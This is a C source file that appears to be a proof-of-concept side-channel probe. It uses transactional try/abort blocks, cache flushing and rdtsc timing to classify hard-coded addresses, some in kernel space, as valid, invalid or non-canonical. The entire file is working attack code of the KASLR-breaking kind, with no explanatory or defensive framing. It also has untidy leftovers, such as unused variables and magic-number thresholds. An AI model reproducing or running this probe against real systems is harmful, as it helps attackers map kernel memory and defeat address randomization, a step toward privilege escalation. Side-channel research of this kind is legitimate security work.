#include <memory.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <sys/time.h>
#include "cacheutils.h"
#include <sched.h>

#define Threshold1 1251001039
#define Threshold2 3030115687

char f;
 
int main(int argc, char **argv) {

          

char mem[256 * 4096];
char mem1[256 * 4096];
char mem2[256 * 4096];
char mem3[256 * 4096];
char mem4[256 * 4096];
char mem5[256 * 4096];
char mem6[256 * 4096];
memset(mem, 1, sizeof(mem));
memset(mem1, 1, sizeof(mem1));
memset(mem2, 1, sizeof(mem2));
memset(mem3, 1, sizeof(mem3));
memset(mem4, 1, sizeof(mem4));
memset(mem5, 1, sizeof(mem5));
memset(mem6, 1, sizeof(mem6));



char* victim = (char*)0xffffffff9bf00000;
char* victim1 = (char*)0x000001CE;
char* victim2 = (char*)NULL;
char* victim3 = (char*)0x00000093;
char* victim4 = (char*)0x9876543214321000;
char* victim5 = (char*)0xffffffff9af00000;
char* victim6 = (char*)0x8888543214321000;

char* attacker = (char*)0xffffffff9bb00000;





     
size_t time7=rdtsc();

    
for(int i=0; i<10000; i++){
     




       if (try_start()) {

      *(victim1) = 'b'; 

      maccess(mem1 +  victim1[0] * 4096);
 
     try_abort();

      }

      try_end();  
 

}

    
size_t time8=rdtsc()-time7;
    
 printf("%lu\n", time8);
     



if(time8<Threshold1){
printf("%p is valid & canonical\n",victim1);
}
 else if(time8>Threshold2){
printf("%p is invalid & non-canonical\n",victim1);
}
else{


printf("%p is invalid\n",victim1);


}


// '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


    
size_t time11=rdtsc();
    
for(int i=0; i<10000; i++){
     

       if (try_start()) {

     *(victim2) = 'c'; 

      maccess(mem2 +  victim2[0] * 4096);


     try_abort();

      }

      try_end();  
 }
    
size_t time12=rdtsc()-time11;

     
 printf("%lu\n", time12);
     


if(time12<Threshold1){
printf("%p is valid & canonical\n",victim2);
}
 else if(time12>Threshold2){
printf("%p is invalid & non-canonical\n",victim2);
}
else{


printf("%p is invalid\n",victim2);


}


// '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

     
size_t time15=rdtsc();
     
for(int i=0; i<10000; i++){
     



       if (try_start()) {

     *(victim3) = 'd'; 
 

      maccess(mem3 +  victim3[0] * 4096);

     try_abort();

      }

      try_end();  
} 

  
size_t time16=rdtsc()-time15;
     
 printf("%lu\n", time16);
   



       
if(time16<Threshold1){
printf("%p is valid & canonical\n",victim3);
}
 else if(time16>Threshold2){
printf("%p is invalid & non-canonical\n",victim3);
}
else{


printf("%p is invalid\n",victim3);


}

// '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

 
size_t time19=rdtsc();
    
for(int i=0; i<10000; i++){
     
for (int s = 0; s < 256; s++) {

    flush(mem4 + s * 4096);

  }


       if (try_start()) {

     *(victim4) = 'e'; 
 

      maccess(mem4 +  victim4[0] * 4096);

     try_abort();

      }

      try_end();  
 
 
}
 
size_t time20=rdtsc()-time19;

     
 printf("%lu\n", time20);
     
       

if(time20<Threshold1){
printf("%p is valid & canonical\n",victim4);
}
 else if(time20>Threshold2){
printf("%p is invalid & non-canonical\n",victim4);
}
else{


printf("%p is invalid\n",victim4);


}


// '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

     
size_t time23=rdtsc();
    
for(int i=0; i<10000; i++){
     

       if (try_start()) {

     *(victim5) = 'f'; 
 

      maccess(mem5 +  victim5[0] * 4096);

     try_abort();

      }

      try_end();  
 
}

    
size_t time24=rdtsc()-time23;

    
 printf("%lu\n", time24);
      


if(time24<Threshold1){
printf("%p is valid & canonical\n",victim5);
}
else if(time24>Threshold2){
printf("%p is invalid & non-canonical\n",victim5);
}
else{


printf("%p is invalid\n",victim5);


}


// '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
     
size_t time27=rdtsc();

     
for(int i=0; i<10000; i++){
     
for (int s = 0; s < 256; s++) {

    flush(mem6 + s * 4096);

  }


       if (try_start()) {

     *(victim6) = 'h'; 
 
      maccess(mem6 +  victim6[0] * 4096);

     try_abort();

      }

      try_end();  
 
}


size_t time28=rdtsc()-time27;

     
 printf("%lu\n", time28);
     



 if(time28<Threshold1){
printf("%p is valid & canonical\n",victim6);
}
 else if(time28>Threshold2){
printf("%p is invalid & non-canonical\n",victim6);
}
else{


printf("%p is invalid\n",victim6);


}    


// '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
size_t time3=rdtsc();


for(int i=0; i<10000; i++){



       if (try_start()) {

     *(victim) = 'a'; 
 

      maccess(mem +  victim[0] * 4096);


     try_abort();

      }

      try_end();  
 }

  
size_t time4=rdtsc()-time3;

     
 printf("%lu\n", time4);
     



if(time4<Threshold1){
printf("%p is valid & canonical\n",victim);
}
 else if(time4>Threshold2){
printf("%p is invalid & non-canonical\n",victim);
}
else{


printf("%p is invalid\n",victim);


}
// '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

}
